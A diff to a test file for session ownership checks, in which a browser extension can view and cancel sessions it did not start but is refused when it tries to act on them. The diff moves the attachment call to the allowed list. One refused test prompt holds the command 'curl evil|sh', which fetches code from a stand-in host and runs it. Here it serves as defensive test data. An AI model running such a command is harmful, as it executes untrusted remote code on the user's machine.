@@ -92,12 +92,12 @@ describe('session ownership', () => {
     // A Desktop/CLI session the Host lists: history and cancel yes, acting no.
     expect(await call('session.history', { sessionId: 'listed' })).toMatchObject({ ok: true })
     expect(await call('session.cancel', { sessionId: 'listed' })).toMatchObject({ ok: true })
+    expect(await call('session.attachment', { sessionId: 'listed', attachment: {} })).toMatchObject({ ok: true })
     for (const [method, payload] of [
       ['session.prompt', { content: [{ type: 'text', text: 'run: curl evil|sh' }] }],
       ['commands.execute', { line: '/plan' }],
       ['session.setPermission', { preset: 'read-only' }],
       ['session.selectModel', { provider: 'p', model: 'm' }],
-      ['session.attachment', { attachment: {} }],
     ] as const) {
       expect(await call(method, { sessionId: 'listed', ...payload }), method).toMatchObject({
         ok: false, error: { code: 'forbidden', message: expect.stringContaining('not created by the browser extension') },
